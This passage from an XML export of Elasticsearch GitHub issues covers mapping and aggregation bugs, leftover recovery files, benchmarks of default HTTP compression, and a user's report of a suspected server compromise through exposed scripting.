</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Report conflict when trying to disable `_ttl`</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7316</link><project id="" key="" /><description>_ttl could never be disabled once it was enabled.
But when trying to, no conflict was reported.

relates to #777 and #7293
</description><key id="40498008">7316</key><summary>Report conflict when trying to disable `_ttl`</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brwe</reporter><labels><label>:Mapping</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-18T15:07:37Z</created><updated>2015-06-07T19:07:01Z</updated><resolved>2014-08-21T14:17:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="brwe" created="2014-08-19T10:48:08Z" id="52617172">Adressed all comments.
</comment><comment author="jpountz" created="2014-08-20T16:37:11Z" id="52805033">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Recovery files left behind when replica building fails</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7315</link><project id="" key="" /><description>We have a situation where several indices need replicas either relocated or rebuilt (we're not sure exactly which of the two caused this situation, but I think it was the initial replica build, rather than relocation).

In one situation, the nodes which we were trying to send the shards to went over their high disk threshold, and the recovery was aborted.
In another, we tickled the recently found bug on recovery and compression.

In both cases (afaict), the shard directory on disk was littered with files named `recovery.*`. Sometimes terabytes of files.
Even when the replica build cancelled, moved on to another host, etc, those files aren't being cleaned up.
</description><key id="40497850">7315</key><summary>Recovery files left behind when replica building fails</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">avleen</reporter><labels><label>bug</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-08-18T15:06:10Z</created><updated>2015-01-24T08:50:42Z</updated><resolved>2014-10-23T13:13:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="suitingtseng" created="2014-09-13T08:40:21Z" id="55485759">I also run into the same problem.
Does any one have the solution?
Can I just delete the recovery.\* files?
</comment><comment author="bleskes" created="2014-09-14T20:55:56Z" id="55539241">@suitingtseng which version of ES are you using?

@avleen sorry for the late response. Is this issue still a problem? Which version are you currently on?

I'm wondering if this is another manifestation of https://github.com/elasticsearch/elasticsearch/issues/7386#issuecomment-53110529
</comment><comment author="suitingtseng" created="2014-09-15T02:13:15Z" id="55547654">I am using 1.3.1.
Thanks for your reply.
</comment><comment author="avleen" created="2014-09-15T04:18:08Z" id="55551754">I found this happening on 1.3.1 also, with the compressed recovery bug. I
haven't had recovery failures since then so I have no more data to gauge
this with :(

On Sun, Sep 14, 2014 at 10:13 PM, suitingtseng notifications@github.com
wrote:

&gt; I am using 1.3.1.
&gt; Thanks for your reply.
&gt; 
&gt; ## 
&gt; 
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/elasticsearch/elasticsearch/issues/7315#issuecomment-55547654
&gt; .
</comment><comment author="bleskes" created="2014-09-15T11:15:13Z" id="55577280">@suitingtseng thx. Did you do a full cluster restart since being on 1.1.0 as #7386 (comment) ? Are there any other error in your logs? 

If you cluster is all green now, you can safely delete the recovery.\* files, though we should figure what they don't go on their own...
</comment><comment author="jlintz" created="2014-09-22T15:53:14Z" id="56394596">Just ran into what I believe is this situation as well.  After 24 hours, some indices are moved to different nodes.  On 2 of the "slow" nodes, 2 shards got into a state where they are growing uncontrollably (should bea round 30GB but are 1.3 TB).  Inside the shard directory it's littered with recovery.\* files.  Running ES 1.3.0 and new recovery files keep being created.  The log on the "slow" node is complaining about "File corruption occured on recovery but checksums are ok"

To expand a bit further, it seems they are caught in an endless recovery cycle and just creating new recovery files over and over unable to repair
</comment><comment author="yangou" created="2015-01-23T23:36:15Z" id="71285291">Any one solved this issue or is there any walk around?
Simple question: Can I just manual rm those recovery file? They are eating up most of my disk spaces.
I'm having tons of recovery files to and I'm upgrading from 1.1 to 1.4.2.
</comment><comment author="avleen" created="2015-01-24T06:45:30Z" id="71303042">I manually rm'd them here, and it was OK.

On Fri Jan 23 2015 at 6:36:59 PM yangou notifications@github.com wrote:

&gt; Any one solved this issue or is there any walk around?
&gt; Simple question: Can I just manual rm those recovery file? They are eating
&gt; up most of my disk spaces.
&gt; I'm having tons of recovery files to and I'm upgrading from 1.1 to 1.4.2.
&gt; 
&gt; ## 
&gt; 
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/elasticsearch/elasticsearch/issues/7315#issuecomment-71285291
&gt; .
</comment><comment author="bleskes" created="2015-01-24T08:50:42Z" id="71305571">@yangou the issue is solved but the fix will be released with 1.5.0  (no ETA yet). You can safely remove the recovery.\* files of all old recoveries. To check what are the currently active recoveries you can call `GET _cat/recovery?active_only=true`
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Tests: tone down random compression tests</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7314</link><project id="" key="" /><description>We have a dedicated regression test (`CorruptedCompressorTests`) for the bug we found, so I think its safe to town these tests down instead of allowing them to take minutes.
</description><key id="40493622">7314</key><summary>Tests: tone down random compression tests</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rmuir</reporter><labels /><created>2014-08-18T14:25:41Z</created><updated>2014-08-18T14:38:27Z</updated><resolved>2014-08-18T14:38:27Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dakrone" created="2014-08-18T14:28:58Z" id="52499784">"Completed in 2.53s, 11 tests", much better :)

LGTM, thanks @rmuir!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fixes pre and post offset serialisation for histogram aggs</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7313</link><project id="" key="" /><description>Changes the serialisation of pre and post offset to use Long instead of VLong so that negative values are supported.  This actually only showed up in the case where minDocCount=0 as the rounding is only serialised in this case.

Closes #7312
</description><key id="40493570">7313</key><summary>Fixes pre and post offset serialisation for histogram aggs</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Aggregations</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-18T14:25:09Z</created><updated>2015-06-07T19:07:09Z</updated><resolved>2014-08-21T13:30:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-18T16:12:10Z" id="52514984">I was first afraid this bug might have been introduced by #6980 but it seems that it is not the case, right?

Just left a comment about backward compatibility of the stream. Otherwise it looks good.
</comment><comment author="colings86" created="2014-08-18T18:12:56Z" id="52531960">Yep, I think it was present before I made that change and refactored the class.

Have updated the serialisation to solve the backwards compatibility issue
</comment><comment author="jpountz" created="2014-08-19T08:28:30Z" id="52604149">I think we shouldn't change the serialization format in a minor release, so I would rather fix it in 1.4.0 only? Otherwise LGTM.
</comment><comment author="s1monw" created="2014-08-21T13:05:37Z" id="52916476">LGTM thanks for all the iterations!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregations: DateHistogram with negative 'pre_offset' or 'post_offset' value ends with "Message not fully read (response) for"</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7312</link><project id="" key="" /><description>Hey guys,

We're using version 1.3.2 and Oracle JRE: 1.7.0_67. The cluster has 3 nodes (2 data nodes and 1 used only to route searches).

There is a separate (different named) cluster of 1 node using marvel to collect statistics from the first one. No other nodes in the network, and no custom/manually made java clients around.

As the title says, when doing a DateHistogramAggregation using a negative value for either **pre_offset** or **post_offset** yields the message:

" [transport.netty          ]  Message not fully read (response) for [69208] handler org.elasticsearch.search.action.SearchServiceTransportAction$6@f58070b, error [false], resetting" in the logs.

Note that every other query works flawlessly. This is only reproduceable when using the arguments _pre_offset_ and/or _post_offset_ in a DateHistogram with a negative value and with more than 1 node in the cluster.

Facts so far:
- Gist with the output of [_nodes?jvm=true&amp;pretty](https://gist.github.com/marcelog/010c0bdb1c6bf9b664f1).
- Gist with [sample query](https://gist.github.com/marcelog/d96f5ad06944da1231d7)
- **Same query**, but **without negative values** in _pre_offset_ and _post_offset_ **works** (it doesn't return the results we expect, of course, but no errors/warnings are shown in the logs)
- This [previous issue](https://github.com/elasticsearch/elasticsearch/issues/5178) doesn't seem to be related, there are no other nodes in the network and there are no "custom" java clients around either. 
- The sample query **works when there is only one node in the cluster** and we start to get these error messages when adding more nodes (2 will suffice to reproduce the issue).

Any ideas? In the meantime, we solved the issue by using _pre_zone_ and _post_zone_ instead of _pre_offset_ and _post_offset_. Negative values are ok, and everything is running smoothly with those (we tried index, search, and snapshot operations).  No error messages in the logs.

Thanks in advance,
</description><key id="40488787">7312</key><summary>Aggregations: DateHistogram with negative 'pre_offset' or 'post_offset' value ends with "Message not fully read (response) for"</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">marcelog</reporter><labels><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-18T13:41:24Z</created><updated>2014-08-21T13:30:22Z</updated><resolved>2014-08-21T13:30:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="marcelog" created="2014-08-18T14:39:36Z" id="52501363">Wow that was _really_ fast! Thanks :)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make `and` filter parsing stricter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7311</link><project id="" key="" /><description>Hi,

For the following version:

``` javascript
   "version": {
      "number": "1.1.1",
      "build_hash": "f1585f096d3f3985e73456debdc1a0745f512bbc",
      "build_timestamp": "2014-04-16T14:27:12Z",
      "build_snapshot": false,
      "lucene_version": "4.7"
   }
```

I'm getting weird behaviour for `and` filter combined with `size` in the request payload.

``` javascript
{
   "query": {
      "match_all": {}
   },
   "filter": {
      "and": [
         [
            {
               "exists": {
                  "field": "boo.foo"
               }
            },
            {
               "term": {
                  "something": "46850009-cef7-4703-8877-29a2577f6d1d"
               }
            }
         ]
      ]
   },
   "_source": [
    // list of fields
   ],
   "sort": [
      {
         "foo_id": "asc"
      }
   ],
   "size": "30"
}
```

This query results with `count=20`, but only 10 hits (so `size` falls back to default).
However, if I put the `size: 30` attribute on top of the query payload like so:

``` javascript
{
   "size": 30,
   "query": {
    // ... snip
```

I receive `count=20` with 20 hits as expected.
FWIW, the order of payload properties doesn't seem to matter when not using `and` filter.

Am I missing something?
</description><key id="40485078">7311</key><summary>Make `and` filter parsing stricter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">aerosol</reporter><labels><label>adoptme</label><label>bug</label></labels><created>2014-08-18T12:58:28Z</created><updated>2015-08-26T15:12:08Z</updated><resolved>2015-08-26T15:12:08Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-18T13:13:13Z" id="52489621">@aerosol You have double arrays in your `and` filter, which is throwing off the parsing.  I've changed the title to the real issue: we should throw a syntax error in this situation.
</comment><comment author="aerosol" created="2014-08-18T13:26:50Z" id="52491169">aha, nice catch. Thanks @clintongormley 
</comment><comment author="jpountz" created="2015-08-26T15:12:08Z" id="135056694">Closing as `and` is now deprecated anyway.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Query Parsing not robust against dateOptionali formatted fields</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7310</link><project id="" key="" /><description>My query looks like this:

```
   "query": {
      "query_string": {
         "query": "myquery",
         "fields": [
            "stringField1",
            "stringField2",
            "dateOptionalTimeField"
         ]
      }
   }
```

which leads to an HTTP 400: `ElasticsearchParseException[failed to parse date field [myquery], tried both date format [dateOptionalTime], and timestamp number]; nested: IllegalArgumentException[Invalid format: \"myquery\"]; }`

If I remove the `"dateOptionalTimeField"` field from the search I get a  result.
If I delete the fields info altogether or have `fields: ["_all"]` I get the same correct result.

In my opinion the parsing should be robust enough to fulfill the search request without the error.
</description><key id="40476568">7310</key><summary>Query Parsing not robust against dateOptionali formatted fields</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">richtmat</reporter><labels /><created>2014-08-18T11:01:50Z</created><updated>2014-08-18T11:38:02Z</updated><resolved>2014-08-18T11:15:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-18T11:15:16Z" id="52479242">@richtmat You are looking for the `lenient` option: http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-query-string-query.html#query-dsl-query-string-query
</comment><comment author="richtmat" created="2014-08-18T11:24:44Z" id="52480004">Thanks Clinton, is there such an option on the simple_query_string ? I use them both and have the issue on it as well.
</comment><comment author="richtmat" created="2014-08-18T11:38:02Z" id="52481011">as I understand, there is: https://github.com/elasticsearch/elasticsearch/pull/5208 but it's not mentioned in the docs.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Enable HTTP compression by default</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7309</link><project id="" key="" /><description>See https://github.com/elasticsearch/elasticsearch/pull/7241#issuecomment-52343350
</description><key id="40471159">7309</key><summary>Enable HTTP compression by default</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">clintongormley</reporter><labels><label>:REST</label><label>enhancement</label><label>v5.0.0-alpha3</label></labels><created>2014-08-18T09:51:45Z</created><updated>2016-05-13T13:11:53Z</updated><resolved>2016-05-03T06:53:45Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="c-a-m" created="2014-08-21T22:57:14Z" id="52996393">Ryan pointed out the BREACH vulnerability with SSL and compression.  I think it still should be on default in ES, but off by default if SSL is enabled
</comment><comment author="clintongormley" created="2014-08-22T07:01:52Z" id="53029406">@c-a-m ok, so we should leave this open then, no?
</comment><comment author="c-a-m" created="2014-09-25T19:28:05Z" id="56870625">I just realized that the BREACH vulnerability is with a compression feature of TLS, it has nothing to do with HTTP level compression.  This is totally fine to be left on by default.
</comment><comment author="clintongormley" created="2016-03-01T10:42:35Z" id="190658238">Apparently HTTP compression was disabled originally because the LZF(?) library used by Netty had memory leaks.  Need to check if this is still the case.
</comment><comment author="jimczi" created="2016-03-29T14:26:46Z" id="202919272">I did some stress tests with es 2.3 and was not able to reproduce the leak. It seems that the http compression was disabled by default because "many clients are buggy when it comes to supporting it." https://github.com/elastic/elasticsearch/issues/1482
I've tested sending compressed data and receiving compressed data with elasticsearch-py on my local machine. Compression did not help for the performance and can also degrade some types of queries (scroll queries are 20% slower when the compression is enabled). Tough my test is not realistic at all, I am using a mac book air and all my queries are local to my machine. I guess that the compression could help if the network is congested.
Bottom line is that we can re-enable http compression by default but it will not change anything if the users do not send the appropriate header which activates the compression of the response (Accept-Encoding: gzip) in their requests.
</comment><comment author="clintongormley" created="2016-03-30T18:56:00Z" id="203579747">@jimferenczi thanks for testing this.  Of course, testing on your local machine avoids network latency so you see the downside of compression without it really having the opportunity to shine.

&gt; Bottom line is that we can re-enable http compression by default but it will not change anything if the users do not send the appropriate header which activates the compression of the response (Accept-Encoding: gzip) in their requests.

Agreed.  I think most (if not all) of the official clients have compression support, as long as the user enables it.  If we decide to enable it by default, then the client authors can make the appropriate changes.

@jpountz what do you think of enabling it by default?
</comment><comment author="jpountz" created="2016-03-31T15:00:43Z" id="203976894">The size of responses seems to be a pretty common source of complaints so I think we should try to enable it by default. I suspect that our responses have a lot of duplicated strings so even low levels of compression would already reduce the size of the data significantly. So we could try to enable it by default eg. with a compression level of 3 (currently the default level is 6, 3 is the highest compression level of DEFLATE that does not use lazy match evaluation, which tends to make compression slow). This way we would limit the potential bad performance impacts of having compression on by default?
</comment><comment author="jimczi" created="2016-04-01T07:50:26Z" id="204297841">I've tested the full compression scheme (send and receive compressed content) with a compression level of 6. I'll check with the response compression only and a compression level of 3 if the impact is visible in terms of performance. 
</comment><comment author="danielmitterdorfer" created="2016-04-21T07:04:30Z" id="212774464">I have benchmarked this scenario with Rally against a single node cluster with default settings except for the heap size (which I set to `-Xms4G -Xmx4G`) of a recent master build of Elasticsearch (revision 6921712). I used a dedicated bare metal machine for Rally and a dedicated one for the benchmark candidate. I used compression level 9 to amplify the effect of compression as much as possible and compressed all requests and responses. The data set was the same geonames benchmark that we also use in the nightly benchmarks. Preliminary results show:
- Network traffic is significantly lower  (around 25 vs. around 3GB sent, around 3.4GB vs. 350MB received)
- Indexing throughput and CPU utilization during indexing is roughly equivalent
- Query latency suffers drastically, especially in the higher percentiles (90% percentile and above). Worst are the scroll query and the term query.

Details are in the attached graphics from the Kibana dashboard which are _currently_ also available at https://b7dea5252a72b78502fc91e0462fca7e.us-east-1.aws.found.io/app/kibana#/dashboard/HTTP-Compression-Benchmark-Results (I may remove them at any time; that's why I uploaded the screenshot for reference):

![http-benchmark-results](https://cloud.githubusercontent.com/assets/1699576/14700444/e81a8534-079f-11e6-8dd0-57f821cdb746.png)

 I'll run a few more benchmarks but so far I can confirm Jim's testing.
</comment><comment author="jimczi" created="2016-04-21T08:42:19Z" id="212813674">Thanks @danielmitterdorfer. 

&gt; Indexing throughput and CPU utilization during indexing is roughly equivalent

This is really a big win, most of the traffic is generated during indexing IMO we should really accept compressed request by default.

&gt; Query latency suffers drastically, especially in the higher percentiles (90% percentile and above). Worst are the scroll query and the term query.

This is the tricky part. In my tests the request and the response (and I guess it's the same here) are compressed. IMO we should never compress a body smaller than 1k.
What do you think of adding a minimum body size to enable compression on both end (server and client) ? 
</comment><comment author="jpountz" created="2016-04-21T09:01:03Z" id="212820776">Is the issue really with small bodies? If the body is small, then likely it will be very fast to compress as well? I was more under the assumption that scrolls and term queries have a performance hit because they are among the cheapest queries that you can send to elasticsearch? I would be curious to see how different the results are with a compression level of 1.
</comment><comment author="clintongormley" created="2016-04-21T09:16:26Z" id="212824706">@danielmitterdorfer you say:

&gt; we should really accept compressed request by default.

If you were using the python client, I'm pretty sure the request was not compressed, only the response.
</comment><comment author="jimczi" created="2016-04-21T09:41:38Z" id="212832844">@clintongormley I think he was using a custom connection that enable the compression on the client side. In fact I am pretty sure he did because the received bytes on es side is way lower when compression is "on". 
</comment><comment author="danielmitterdorfer" created="2016-04-21T10:15:32Z" id="212844055">&gt; @danielmitterdorfer you say:
&gt; 
&gt; &gt;    we should really accept compressed request by default.

@clintongormley This was @jimferenczi. I did not draw any conclusions yet. ;) I'll gather more data points (different compression rates) and also investigate a few issues. Btw, Jim was right: I used a custom connection in the Python client that gzips the request
</comment><comment author="danielmitterdorfer" created="2016-04-21T10:42:45Z" id="212851507">I just checked the impact of Python 3.5 stdlib gzip compression for bulk requests (with a bulk size of 5000) and a sample query (result of 100 trials in a [microbenchmark](https://gist.github.com/danielmitterdorfer/48ff9ec8fc1e62252e67ca9e62b346f5)):

| Comment | Size [bytes] | Min compression time (ms) | Mean compression time (ms) | Max compression time (ms) |
| --- | --- | --- | --- | --- |
| Bulk request with 5000 items | 1829194 | 103.12 | 105.10 | 114.09 |
| Aggregation Query | 330 | 0.023 | 0.023 | 0.066 |

So the overhead on client side is negligible.
</comment><comment author="danielmitterdorfer" created="2016-04-22T11:34:20Z" id="213388282">I ran a couple of further experiments. Again, preliminary results but with larger scroll sizes, `org.jboss.netty.util.internal.jzlib.ZStream.deflate(int)` completely dominates the profile, i.e. it's spending more than half of its time compressing the result. With a compression level of 1, `ZStream` uses a different compression approach which does not show up that high in the profile btw.
</comment><comment author="danielmitterdorfer" created="2016-04-26T11:30:53Z" id="214711599">The relevant source in the Netty code base indicates that the same compression approach is used for compression levels from 1 to 3 (see https://github.com/netty/netty/blob/netty-3.10.5.Final/src/main/java/org/jboss/netty/util/internal/jzlib/Deflate.java#L79-L81) so I also benchmarked with a compression level of 3. In the benchmarked scenario (geonames) indicates that we can save a negligible amount of network traffic compared to level 1. Query latency also increases a little bit.

I will run the benchmark results against another data set to add one data point more but I'd suggest that in the interest of query latency we reduce the default compression level either to 1 or 3 if we enable HTTP compression by default.

Interactive results are available at https://elasticsearch-benchmarks.elastic.co/app/kibana#/dashboard/HTTP-Compression-Benchmark-Results

Below is a full-page screenshot of the same page:

![http_comp_geonames](https://cloud.githubusercontent.com/assets/1699576/14816772/0a4cedd8-0bb3-11e6-9e62-6f9d81f13245.png)
</comment><comment author="clintongormley" created="2016-04-26T11:35:09Z" id="214712592">We should enable request decompression regardless of whether response decompression is enabled, ie in https://github.com/elastic/elasticsearch/blob/master/core/src/main/java/org/elasticsearch/http/netty/NettyHttpServerTransport.java#L547 change ESHttpContentDecompressor to HttpContentDecompressor.

Also, the comment about BREACH https://github.com/elastic/elasticsearch/issues/7309#issuecomment-56870625 appears to be incorrect (see http://breachattack.com/) so we should default compression to disabled if SSL is enabled.
</comment><comment author="danielmitterdorfer" created="2016-04-29T16:20:43Z" id="215790726">I also ran a microbenchmark of Netty's `ZlibEncoder` and `JdkZlibEncoder` (refered to as `jzlib` and `jdk` below) with a smaller JSON document (a few hundred bytes) and a larger JSON document (3.6MB) at different compression levels to see whether we should change the encoder implementation for performance reasons but the benchmark results indicate we should not change it (especially at smaller compression levels):

```
Benchmark                  (compressionLevel)  (impl)  (smallDocument)   Mode  Cnt       Score     Error  Units
NettyZlibBenchmark.encode                   1   jzlib            false  thrpt  150      75.960 &#177;   0.051  ops/s
NettyZlibBenchmark.encode                   1   jzlib             true  thrpt  150  195383.389 &#177; 690.821  ops/s
NettyZlibBenchmark.encode                   1     jdk            false  thrpt  150      68.254 &#177;   0.154  ops/s
NettyZlibBenchmark.encode                   1     jdk             true  thrpt  150  159102.287 &#177; 227.628  ops/s
NettyZlibBenchmark.encode                   3   jzlib            false  thrpt  150      74.859 &#177;   0.057  ops/s
NettyZlibBenchmark.encode                   3   jzlib             true  thrpt  150  187901.799 &#177; 612.592  ops/s
NettyZlibBenchmark.encode                   3     jdk            false  thrpt  150      67.480 &#177;   0.042  ops/s
NettyZlibBenchmark.encode                   3     jdk             true  thrpt  150  159002.153 &#177; 101.567  ops/s
NettyZlibBenchmark.encode                   6   jzlib            false  thrpt  150      38.250 &#177;   0.023  ops/s
NettyZlibBenchmark.encode                   6   jzlib             true  thrpt  150   84190.875 &#177; 303.414  ops/s
NettyZlibBenchmark.encode                   6     jdk            false  thrpt  150      35.101 &#177;   0.179  ops/s
NettyZlibBenchmark.encode                   6     jdk             true  thrpt  150   86632.628 &#177;  77.181  ops/s
NettyZlibBenchmark.encode                   9   jzlib            false  thrpt  150      11.812 &#177;   0.017  ops/s
NettyZlibBenchmark.encode                   9   jzlib             true  thrpt  150   54201.944 &#177;  89.032  ops/s
NettyZlibBenchmark.encode                   9     jdk            false  thrpt  150      11.894 &#177;   0.021  ops/s
NettyZlibBenchmark.encode                   9     jdk             true  thrpt  150   60536.066 &#177; 101.270  ops/s
```

The benchmark was run on a silent server class machine (Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, Linux Kernel 4.2.0-34). It was pinned to core 0 with `taskset -c 0 java -jar netty-zlib-0.1.0-all.jar -f 5 -wi 30 -i 30`. I verified (in a separate trial run) with JMH's perf profiler that we had no CPU migrations. All cores ran with the performance CPU governor at 3.4GHz.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Command .fsdo taking up all the resources</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7308</link><project id="" key="" /><description>Hi
I am not sure what invoked this, but I was seeing a daemon running by user elasticsearch and as per the `top` command running a command .fsdo. It took up all my resources of my VPS (As our vps provider was complaining repeatedly). No Idea what invoked this. Elasticsearch search service was started and stopped couple of times, and there was no effect on the process. I had to kill it to regain my resources. Any idea, what was it, and what went wrong?
Regards
Biswajit
</description><key id="40469311">7308</key><summary>Command .fsdo taking up all the resources</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">biswajitdas</reporter><labels><label>feedback_needed</label></labels><created>2014-08-18T09:26:23Z</created><updated>2014-08-19T06:45:38Z</updated><resolved>2014-08-18T10:05:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-18T09:56:18Z" id="52472200">@biswajitdas Did you have Elasticsearch open to the internet with scripting enabled? I wonder if .fsdo is some command that has been added by a hacker.
</comment><comment author="biswajitdas" created="2014-08-18T10:04:27Z" id="52472944">:(
It was open for some time. But can they run a script with the service, when the service not running itself?
</comment><comment author="clintongormley" created="2014-08-18T10:05:20Z" id="52473020">Once they gained access to your box, they can do whatever they like.  I suggest reinstalling your box :)
</comment><comment author="biswajitdas" created="2014-08-18T10:13:25Z" id="52473817">Hi
Are you suggesting they just attacked Elasticsearch, not our database? :( Any idea? I wonder why they have only gone behind Elastic? Can you please look into this matter?
</comment><comment author="clintongormley" created="2014-08-18T11:13:53Z" id="52479094">@biswajitdas   They gained access to your box.  They could do anything that the user that elasticsearch was running under could do.  You need to investigate.
</comment><comment author="biswajitdas" created="2014-08-19T02:57:39Z" id="52584708">Thanks a ton Clinton :+1: , It was indeed a Hack, and blocked the access of it's script. Strangely they have put a shell script via `elasticseach` user. Have to investigate further, how they got access to that user! Are elasticsearch's opened ports are allowed to put a shell script? Any idea?
</comment><comment author="dadoonet" created="2014-08-19T06:10:34Z" id="52594141">@biswajitdas you should read this: http://www.elasticsearch.org/blog/scripting-security/
</comment><comment author="biswajitdas" created="2014-08-19T06:45:38Z" id="52596133">Thanks a Lot @ dadoonet :+1: 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Mapping: Fixes using nested doc array with strict mapping</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7307</link><project id="" key="" /><description>Closes #7304
</description><key id="40467772">7307</key><summary>Mapping: Fixes using nested doc array with strict mapping</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': 